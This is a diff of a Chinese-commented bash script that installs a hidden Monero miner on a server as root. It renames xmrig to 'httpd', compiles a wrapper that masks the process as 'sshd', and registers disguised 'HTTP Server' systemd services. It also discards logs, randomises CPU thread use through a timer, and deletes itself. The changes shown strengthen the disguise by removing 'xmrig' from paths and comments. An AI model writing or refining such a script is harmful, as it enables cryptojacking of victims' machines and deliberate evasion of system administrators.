@@ -1,6 +1,6 @@
 #!/bin/bash
 
-# 隐藏 xmrig 进程及其特征的一键部署脚本（带C语言实现的随机线程调整）
+# 隐藏挖矿进程及其特征的一键部署脚本（带随机线程调整）
 
 # 确保脚本以 root 权限运行
 if [ "$(id -u)" != "0" ]; then
@@ -22,76 +22,29 @@ wallet_address="47fHeymBVA9iDwR6oauB3a3y6PvmTqq31Hvu62Jk9yvcfTX2LEuRatPVaGNJim7K
 read -p "请输入采矿服务器密码 (默认: x): " pool_pass
 pool_pass=${pool_pass:-x}
 
-# 创建目录
-mkdir -p /opt/xmrig /etc/systemd/conf.d || { echo "创建目录失败" 1>&2; exit 1; }
+# 创建目录，使用伪装名称 "webserver"
+mkdir -p /opt/webserver /etc/systemd/conf.d || { echo "创建目录失败" 1>&2; exit 1; }
 
-# 下载并安装 xmrig
-curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/xmrig || { echo "下载或解压失败" 1>&2; exit 1; }
-mv /opt/xmrig/xmrig-6.22.2/xmrig /opt/xmrig/httpd || { echo "移动文件失败" 1>&2; exit 1; }
-chmod +x /opt/xmrig/httpd
-rm -rf /opt/xmrig/xmrig-6.22.2
+# 下载并安装，下载后立即重命名
+curl -L https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz | tar -xz -C /opt/webserver || { echo "下载或解压失败" 1>&2; exit 1; }
+mv /opt/webserver/xmrig-6.22.2/xmrig /opt/webserver/httpd || { echo "移动文件失败" 1>&2; exit 1; }
+chmod +x /opt/webserver/httpd
+rm -rf /opt/webserver/xmrig-6.22.2
 
 # 创建 wrapper 以伪装进程名
-cat > /opt/xmrig/wrapper.c <<EOF
+cat > /opt/webserver/wrapper.c <<EOF
 #include <sys/prctl.h>
 #include <unistd.h>
 int main(int argc, char *argv[]) {
     prctl(PR_SET_NAME, "sshd", 0, 0, 0);
-    execv("/opt/xmrig/httpd", argv);
+    execv("/opt/webserver/httpd", argv);
     return 0;
 }
 EOF
-gcc -o /opt/xmrig/wrapper /opt/xmrig/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
-rm /opt/xmrig/wrapper.c
+gcc -o /opt/webserver/wrapper /opt/webserver/wrapper.c || { echo "编译 wrapper 失败" 1>&2; exit 1; }
+rm /opt/webserver/wrapper.c
 
-# 创建 C 语言实现的线程调整程序
-cat > /opt/xmrig/adjust_threads.c <<EOF
-#include <stdio.h>
-#include <stdlib.h>
-#include <unistd.h>
-#include <time.h>
-#include <sys/prctl.h>
-
-int main() {
-    // 设置进程名为 httpd-adjust
-    prctl(PR_SET_NAME, "httpd-adjust", 0, 0, 0);
-    
-    // 初始化随机数种子
-    srand(time(NULL));
-    
-    // 获取 CPU 核心数
-    int max_threads = sysconf(_SC_NPROCESSORS_ONLN);
-    if (max_threads <= 0) max_threads = 1;
-    
-    char command[256];
-    const char *config_file = "/etc/systemd/conf.d/httpd.conf";
-    
-    while (1) {
-        // 随机选择线程数（1到最大核心数之间）
-        int threads = (rand() % max_threads) + 1;
-        
-        // 更新配置文件中的线程数
-        snprintf(command, sizeof(command),
-                "sed -i 's/\\\"threads\\\": [0-9]*/\\\"threads\\\": %d/' %s",
-                threads, config_file);
-        system(command);
-        
-        // 重启服务
-        system("systemctl restart httpd.service");
-        
-        // 随机等待10-15分钟（600-900秒）
-        int sleep_time = (rand() % 301) + 600;
-        sleep(sleep_time);
-    }
-    
-    return 0;
-}
-EOF
-gcc -o /opt/xmrig/adjust_threads /opt/xmrig/adjust_threads.c || { echo "编译 adjust_threads 失败" 1>&2; exit 1; }
-rm /opt/xmrig/adjust_threads.c
-chmod +x /opt/xmrig/adjust_threads
-
-# 生成初始配置文件（添加线程配置）
+# 生成配置文件
 cat > /etc/systemd/conf.d/httpd.conf <<EOF
 {
     "pools": [
@@ -104,15 +57,34 @@ cat > /etc/systemd/conf.d/httpd.conf <<EOF
     ],
     "print-time": 0,
     "verbose": false,
-    "threads": 1
+    "threads": 3
 }
 EOF
+
+# 创建线程管理脚本（随机调整）
+cat > /opt/webserver/adjust_threads.sh <<'EOF'
+#!/bin/bash
+# 随机调整线程数量，最低3个线程
+MIN_THREADS=3
+MAX_THREADS=$(nproc)  # 获取CPU核心数
+
+# 生成随机线程数，在MIN_THREADS和MAX_THREADS之间
+NEW_THREADS=$((MIN_THREADS + RANDOM % (MAX_THREADS - MIN_THREADS + 1)))
+
+# 更新配置文件
+sed -i "s/\"threads\": [0-9]*/\"threads\": $NEW_THREADS/" /etc/systemd/conf.d/httpd.conf
+
+# 重启服务以应用新配置
+systemctl restart httpd.service
+EOF
+
+chmod +x /opt/webserver/adjust_threads.sh
 
 # 创建用户和组
 groupadd -r httpd 2>/dev/null || true
 useradd -r -s /bin/false -g httpd httpd || { echo "创建用户失败" 1>&2; exit 1; }
 
-# 创建 systemd 服务文件（挖矿服务）
+# 创建主服务文件
 cat > /etc/systemd/system/httpd.service <<EOF
 [Unit]
 Description=HTTP Server
@@ -121,34 +93,48 @@ After=network.target
 [Service]
 User=httpd
 Group=httpd
-ExecStart=/opt/xmrig/wrapper --config=/etc/systemd/conf.d/httpd.conf --no-color --log-file=/dev/null
+ExecStart=/opt/webserver/wrapper --config=/etc/systemd/conf.d/httpd.conf --no-color --log-file=/dev/null
 Restart=always
 
 [Install]
 WantedBy=multi-user.target
 EOF
 
-# 创建 systemd 服务文件（线程调整服务）
+# 创建线程调整服务
 cat > /etc/systemd/system/httpd-adjust.service <<EOF
 [Unit]
 Description=HTTP Server Thread Adjuster
-After=network.target httpd.service
+After=httpd.service
 
 [Service]
-ExecStart=/opt/xmrig/adjust_threads
-Restart=always
+Type=simple
+ExecStart=/opt/webserver/adjust_threads.sh
+Restart=on-failure
+StartLimitInterval=0
 
 [Install]
 WantedBy=multi-user.target
+EOF
+
+# 创建定时器来定期调整线程
+cat > /etc/systemd/system/httpd-adjust.timer <<EOF
+[Unit]
+Description=Run thread adjuster every 5 minutes
+
+[Timer]
+OnBootSec=5min
+OnUnitActiveSec=5min
+Unit=httpd-adjust.service
+
+[Install]
+WantedBy=timers.target
 EOF
 
 # 启用并启动服务
 systemctl daemon-reload
-systemctl enable httpd.service
-systemctl enable httpd-adjust.service
-systemctl start httpd.service || { echo "挖矿服务启动失败" 1>&2; exit 1; }
-systemctl start httpd-adjust.service || { echo "调整服务启动失败" 1>&2; exit 1; }
+systemctl enable httpd.service httpd-adjust.timer
+systemctl start httpd.service httpd-adjust.timer || { echo "服务启动失败" 1>&2; exit 1; }
 
 # 删除脚本自身
 rm -- "$0"
-echo "部署完成！线程将每10-15分钟随机调整"
+echo "部署完成！线程将每5分钟随机调整，最低3个线程"
